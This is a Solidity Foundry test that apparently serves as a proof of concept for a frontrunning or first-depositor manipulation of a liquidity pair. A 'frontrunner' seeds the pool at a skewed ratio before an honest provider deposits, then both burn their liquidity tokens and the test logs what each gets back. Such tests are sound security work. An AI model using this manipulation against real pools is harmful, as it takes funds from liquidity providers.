// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import { Test } from "@forge-std/Test.sol";

import { IERC20 } from "@openzeppelin/token/ERC20/IERC20.sol";

import { Users } from "test/utils/Users.sol";
import { MockERC20 } from "test/mocks/MockERC20.sol";

import { LiquidityTokenERC20 } from "contracts/core/LiquidityTokenERC20.sol";
import { Pair } from "contracts/core/Pair.sol";

import { Utils } from "contracts/libraries/Utils.sol";

import { console } from "@forge-std/console.sol";

contract FrontrunMint is Test, Users {
    /* solhint-disable */
    LiquidityTokenERC20 internal LiquidToken;

    MockERC20 internal TokenOne;
    MockERC20 internal TokenTwo;

    Pair internal PairX;
    /* solhint-enable */

    mapping(address token => mapping(address user => uint256 amount)) internal
        _tokenDistributions;

    mapping(address token => uint256 scale) internal _scales;

    address private _owner;
    address private _frontrunner;

    address[] internal _liquidityProviders;

    function setUp() public virtual {
        uint256 ownersId = _createUserGroup("OWNER");
        _owner = _createUser(ownersId, 100 ether);

        vm.startPrank(_owner);

        LiquidToken = new LiquidityTokenERC20();

        TokenOne = new MockERC20("Token One", "TKN1");
        TokenTwo = new MockERC20("Token Two", "TKN2");

        (address tokenA, address tokenB) =
            Utils.sortTokens(address(TokenOne), address(TokenTwo));

        PairX = new Pair(tokenA, tokenB);

        uint256 decimalsA = tokenA == address(TokenOne)
            ? TokenOne.decimals()
            : TokenTwo.decimals();
        uint256 decimalsB = tokenB == address(TokenOne)
            ? TokenOne.decimals()
            : TokenTwo.decimals();

        _scales[tokenA] = 10 ** decimalsA;
        _scales[tokenB] = 10 ** decimalsB;

        vm.stopPrank();

        (, address[] memory liquidityProviders) =
            _createUserGroup("LIQUIDITY PROVIDER", 2, 100 ether);
        _liquidityProviders = liquidityProviders;

        _mintMockTokensForUsers(liquidityProviders, TokenOne, 5);
        _mintMockTokensForUsers(liquidityProviders, TokenTwo, 5);

        uint256 frontrunnersId = _createUserGroup("FRONTRUNNER");
        _frontrunner = _createUser(frontrunnersId, 100 ether);

        uint256 frontrunAmount0 = 50000 * _scales[address(TokenOne)];
        uint256 frontrunAmount1 = 50000 * _scales[address(TokenTwo)];

        vm.startPrank(_frontrunner);

        TokenOne.mint(frontrunAmount0);
        TokenTwo.mint(frontrunAmount1);

        _tokenDistributions[address(TokenOne)][_frontrunner] = frontrunAmount0;
        _tokenDistributions[address(TokenTwo)][_frontrunner] = frontrunAmount1;
    
        vm.stopPrank();
    }

    function _mintMockTokensForUsers(
        address[] memory accounts,
        MockERC20 token,
        uint256 amount
    ) private {
        amount = amount * 10 ** token.decimals();

        for (uint256 i = 0; i < accounts.length; i++) {
            address account = accounts[i];

            vm.startPrank(account);

            token.mint(amount);

            _tokenDistributions[address(token)][account] = amount;

            vm.stopPrank();
        }
    }

    function _addLiquidity(
        address liquidityProvider,
        address token,
        address pair,
        uint256 ratio
    ) internal returns (uint256 amount) {
        uint256 totalDistribution =
            _tokenDistributions[token][liquidityProvider];
        amount = totalDistribution * ratio / 100;

        vm.prank(liquidityProvider);
        IERC20(token).transfer(pair, amount);
    }

    function _addLiquidityForFrontrun(
        address frontrunner,
        address token,
        address pair
    ) internal returns (uint256) {
        vm.prank(frontrunner);
        IERC20(token).transfer(pair, 1);

        return 1;
    }

    function testFrontrun() external {
        (address tokenA, address tokenB) = PairX.getTokens();

        console.log("*--[FRONTRUN] Frontrunner add liquidity:");
        console.log("|");
        console.log("    Liquidity Ratio:");
        console.log("    Token A:", _tokenDistributions[tokenA][_frontrunner]);
        console.log("    Token B:", 1);
        console.log("    Ratio [A:B]:", _tokenDistributions[tokenA][_frontrunner], ":", 1);

        uint256 frontrunInA = _addLiquidity(_frontrunner, tokenA, address(PairX), 100);
        uint256 frontrunInB = _addLiquidityForFrontrun(_frontrunner, tokenB, address(PairX));

        vm.prank(_frontrunner);
        uint256 frontrunTokens = PairX.mint(_frontrunner);
    
        console.log("|");
        console.log("*--[FRONTRUN] Frontrunner mint:");
        console.log("|");
        console.log("    Liquidity Tokens:", frontrunTokens);

        address liquidityProvider = _liquidityProviders[0];

        console.log("|");
        console.log("*--[FRONTRUN] Provider add liquidity:");
        console.log("|");
        console.log("    Liquidity Ratio:");
        console.log("    Token A:", _tokenDistributions[tokenA][liquidityProvider]);
        console.log("    Token B:", _tokenDistributions[tokenB][liquidityProvider]);
        console.log("    Ratio [A:B]:", _tokenDistributions[tokenA][liquidityProvider] / _tokenDistributions[tokenB][liquidityProvider], ":", 1);
        
        uint256 providerInA = _addLiquidity(liquidityProvider, tokenA, address(PairX), 100);
        uint256 providerInB = _addLiquidity(liquidityProvider, tokenB, address(PairX), 100);
   
        vm.prank(liquidityProvider);
        uint256 providerTokens = PairX.mint(liquidityProvider);

        console.log("|");
        console.log("*--[FRONTRUN] Provider mint:");
        console.log("|");
        console.log("    Liquidity Tokens:", providerTokens);
        
        vm.startPrank(_frontrunner);
        
        PairX.transfer(address(PairX), frontrunTokens);
        (uint256 frontrunOutA, uint256 frontrunOutB) = PairX.burn(_frontrunner);
        
        vm.stopPrank();
        
        console.log("|");
        console.log("*--[FRONTRUN] Frontrunner Burn:");
        console.log("    Before => After");
        console.log("    Token A:");
        console.log("    ",frontrunInA, "=>", frontrunOutA);
        console.log("    Token B:");
        console.log("    ", frontrunInB, "=>", frontrunOutB);
        
        vm.startPrank(liquidityProvider);
        
        PairX.transfer(address(PairX), providerTokens);
        (uint256 providerOutA, uint256 providerOutB) = PairX.burn(liquidityProvider);
        
        vm.stopPrank();
        
        console.log("|");
        console.log("*--[FRONTRUN] Provider Burn:");
        console.log("    Before => After");
        console.log("    Token A:");
        console.log("    ",providerInA, "=>", providerOutA);
        console.log("    Token B:");
        console.log("    ", providerInB, "=>", providerOutB);
        console.log("|");
        console.log(" \\__________________________");
    }
}
